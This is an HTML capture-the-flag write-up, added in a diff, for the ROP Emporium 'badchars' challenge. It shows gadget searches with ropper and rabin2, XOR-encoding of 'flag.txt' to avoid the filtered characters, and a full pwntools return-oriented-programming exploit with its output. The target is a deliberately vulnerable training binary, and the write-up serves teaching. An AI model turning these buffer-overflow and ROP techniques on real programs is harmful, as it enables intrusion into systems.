@@ -1,0 +1,212 @@
+<html>
+<head>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre>
+
+<h1>ROP Emporium Pt. 5: badchars</h1>
+<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
+before continuing</r>
+
+<a href="https://ropemporium.com">ROP Emporium</a> is a collection of challenges designed to teach return-oriented 
+programming (ROP) techniques by slowly introducing new concepts and increasing 
+difficulty. If you're looking for a spoiler-free guide, check out the one 
+included on their <a href="https://ropemporium.com/guide.html">website</a>. 
+
+This challenges builds upon the last by adding in a set of bad characters that
+will halt the execution of our chain upon usage. The challenge hint suggests
+two possible ways of approaching this:
+
+1. Avoiding the characters altogether
+or
+2. Using an XOR function to alter our string in memory.
+
+<a href="https://ropemporium.com/challenge/badchars.html">badchars.html</a>
+───────────────────────────────────────────────────────────────────────────────
+  Think about how we're going to overcome the badchars issue; should we try to 
+  avoid them entirely, or could we use gadgets to change our string once it's 
+  in memory?
+───────────────────────────────────────────────────────────────────────────────
+
+We'll start by running the program once to allow it to print out the bad chars.
+
+./badchars
+──────────────────────────────────
+  $ ./badchars 
+  badchars by ROP Emporium
+  x86_64
+
+  badchars are: 'x', 'g', 'a', '.'
+  >
+──────────────────────────────────
+
+Like before, we have a print_file() function to which we'll need to pass our
+string 'flag.txt'. Unfortunately, that string contains not just one, but all
+of our bad chars.
+
+First, we'll use radare to locate that function.
+
+rabin2
+────────────────────────────────────────────────────
+  rabin2 -i ./badchars
+  [Imports]
+  nth vaddr      bind   type   lib name
+  ―――――――――――――――――――――――――――――――――――――
+  1   0x00400500 GLOBAL FUNC       pwnme
+  2   ---------- GLOBAL FUNC       __libc_start_main
+  3   ---------- WEAK   NOTYPE     __gmon_start__
+  4   0x00400510 GLOBAL FUNC       print_file
+────────────────────────────────────────────────────
+
+We can then use Ropper to check if we have the gadgets to XOR our string.
+
+ropper
+────────────────────────────────────────────────────
+  $ ropper -f ./badchars | grep xor
+  <g>[INFO]</g> Load gadgets from cache
+  <g>[LOAD]</g> loading... 100%
+  <g>[LOAD]</g> removing double gadgets... 100%
+  <r>0x0000000000400628</r>: <r>xor</r> byte ptr [r15], r14b<bl>;</bl> <y>ret</y><bl>;</bl> 
+  <r>0x0000000000400629</r>: <r>xor</r> byte ptr [rdi], dh<bl>;</bl> <y>ret</y><bl>;</bl>
+────────────────────────────────────────────────────
+
+Next, we'll find a gadget to pop r14 and r15, for the XOR function.
+
+ropper
+────────────────────────────────────────────
+  $ ropper -f ./badchars | grep r14
+  <r>0x00000000004006a0</r>: <y>pop</y> <r>r14</r><bl>;</bl> <y>pop</y> <r>r15</r><bl>;</bl> <y>ret</y><bl>;</bl>
+────────────────────────────────────────────
+
+And, gadgets to write our string.
+
+ropper
+──────────────────────────────────────────────────────────────
+  $ ropper -f ./badchars | grep r13
+  <r>0x0000000000400634</r>: <y>mov</y> <r>qword</r> ptr [<r>r13</r>], <r>r12</r><bl>;</bl> <y>ret</y><bl>;</bl>
+  <r>0x000000000040069c</r>: <y>pop</y> <r>r12</r><bl>;</bl> <y>pop</y> <r>r13</r><bl>;</bl> <y>pop</y> <r>r14</r><bl>;</bl> <y>pop</y> <r>r15</r><bl>;</bl> <y>ret</y><bl>;</bl>
+──────────────────────────────────────────────────────────────
+
+And to pop rdi, to pass to the print_file() function.
+
+ropper
+───────────────────────────────────
+  $ ropper -f ./badchars | grep rdi
+  <r>0x00000000004006a3</r>: <y>pop</Y> rdi<bl>;</bl> <y>ret</y><bl>;</bl>
+───────────────────────────────────
+
+Next, we'll find the address to write our string to.
+
+rabin2
+────────────────────────────────────────────────────────────────
+  $ rabin2 -S ./badchars | grep .data
+  23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    <r>.data</r>
+────────────────────────────────────────────────────────────────
+
+Now we'll write a function to do the inital XOR of our string in Python.
+Then our exploit will be something like:
+
+junk + pop_r12_r13_r14_r15 + flag + .data + 0 + 0 + mov_13_12
+8 times (+ pop_r14_r15 + 2 + (.data + i))
++ pop_rdi + .data + print_file()
+
+The XOR section needs to be iterated over each character of our string, since
+our string is 8 characters, we need 8 iterations.
+
+Starting from 1, the first key that results in none of the bad characters being
+used is 2, resulting in a string that looks like 'dnce,vcv', so that's what we
+will use for our XOR function.
+
+Cyberchef makes it easy to experiment with these values but to implement this
+in Python, it will look something like:
+
+exploit.py
+───────────────────────────────────
+  <y>def</y> <bl>xorString</bl>(a):
+      output = <pl>""</pl>
+      <y>for</y> i <y>in</y> a:
+          output += <bl>chr</bl>(<bl>ord</bl>(i) ^ <pl>2</pl>)
+      <y>return</y> output
+───────────────────────────────────
+
+And, the full exploit:
+
+exploit.py
+────────────────────────────────────────────────────
+  <bl>from</bl> pwn <bl>import</bl> *
+  
+  <y>def</y> <bl>xorString</bl>(a):
+      output = b<pl>''</pl>
+      <y>for</y> i <y>in</y> a:
+          output += <bl>bytes</bl>(<bl>chr</bl>(<bl>ord</bl>(i) ^ <pl>2</pl>), <pl>'utf-8'</pl>)
+      <y>return</y> output
+
+  e = ELF(<pl>'badchars'</pl>)
+  p = process(e.path)
+  context(arch=<pl>'amd64'</pl>, os=<pl>'linux'</pl>, endian=<pl>'little'</pl>)
+
+  junk = b<pl>'A'</pl> * <pl>40</pl>
+  pop_r12_r13_r14_r15 = p64(<pl>0x40069c</pl>)
+  flag = (xorString(<pl>"flag.txt"</pl>))
+  <bl>print</bl>(flag)
+  data = <pl>0x00601038</pl> <bl># 0x601028</bl>
+  mov_13_12 = p64(<pl>0x400634</pl>)
+  pop_r14_r15 = p64(<pl>0x4006a0</pl>)
+  xor_r14_r15 = p64(<pl>0x400628</pl>)
+  pop_rdi = p64(<pl>0x4006a3</pl>)
+  print_file = p64(<pl>0x400510</pl>)
+
+  payload = junk
+  payload += pop_r12_r13_r14_r15
+  payload += flag
+  payload += p64(data)
+  payload += p64(<pl>1</pl>)
+  payload += p64(<pl>1</pl>)
+  payload += mov_13_12
+  <y>for</y> i <y>in</y> <bl>range</bl>(<pl>8</pl>):
+      payload += pop_r14_r15
+      payload += p64(<pl>2</pl>)
+      payload += p64(data + i)
+      payload += xor_r14_r15
+  payload += pop_rdi
+  payload += p64(data)
+  payload += print_file
+
+  <bl>print</bl>(payload)
+
+  p.sendline(payload)
+  log.info(p.clean())
+────────────────────────────────────────────────────
+
+For some reason when we run the exploit, it works for all but one character,
+the 'z' which fails to decode back into an 'x'. 
+
+badchars
+──────────────────────────────────────
+  $ python3 ./exploit.py
+  [*] badchars by ROP Emporium
+      x86_64
+    
+      badchars are: 'x', 'g', 'a', '.'
+      > Thank you!
+      Failed to open file: flag.tzt
+──────────────────────────────────────
+
+But, if we modify the rw section that we are using, from .data to .bss, it
+functions as expected.
+
+badchars
+──────────────────────────────────────
+  $ python3 ./exploit.py
+  [*] badchars by ROP Emporium
+      x86_64
+    
+      badchars are: 'x', 'g', 'a', '.'
+      > Thank you!
+      ROPE{a_placeholder_32byte_flag!}
+──────────────────────────────────────
+
+</pre>
+</body>
+</html>
